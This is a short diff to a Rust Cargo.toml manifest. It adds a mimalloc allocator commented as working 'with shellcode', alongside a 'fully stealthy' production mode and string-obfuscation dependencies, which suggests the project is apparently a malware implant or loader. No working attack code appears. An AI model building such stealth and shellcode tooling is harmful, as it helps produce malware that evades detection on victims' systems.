@@ -9,6 +9,8 @@ dev = []  # Development mode: console window + debug prints
 production = []  # Production mode: no console, no debug prints, fully stealthy
 
 [dependencies]
+# Global allocator that works with shellcode (no TLS)
+mimalloc = { version = "0.1", default-features = false }
 # Ofuscación de strings en compile-time
 obfstr = "0.4"
 # Random number generation for obfuscation
